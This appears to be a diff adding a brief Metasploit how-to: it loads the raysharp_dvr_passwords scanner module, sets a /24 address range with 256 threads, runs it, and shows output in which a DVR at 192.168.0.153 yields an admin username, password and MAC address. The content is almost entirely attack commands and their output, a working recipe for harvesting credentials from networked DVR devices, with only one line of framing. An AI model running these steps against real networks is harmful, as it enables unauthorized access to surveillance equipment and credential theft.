@@ -1,0 +1,20 @@
+$ sudo -s -E
+
+# msfconsole
+
+msf> use auxiliary/scanner/misc/raysharp_dvr_passwords
+
+ 
+
+Once the module is loaded, enter the IP or IP range that you would like to test:
+
+ 
+
+msf  auxiliary(raysharp_dvr_passwords) > set RHOSTS 192.168.0.0/24
+
+msf  auxiliary(raysharp_dvr_passwords) > set THREADS 256
+
+msf  auxiliary(raysharp_dvr_passwords) > run
+
+
+[+] 192.168.0.153:9000 (user='admin' pass='1234546') mac=00-23-63-63-63-63 version=V2.1-20110716
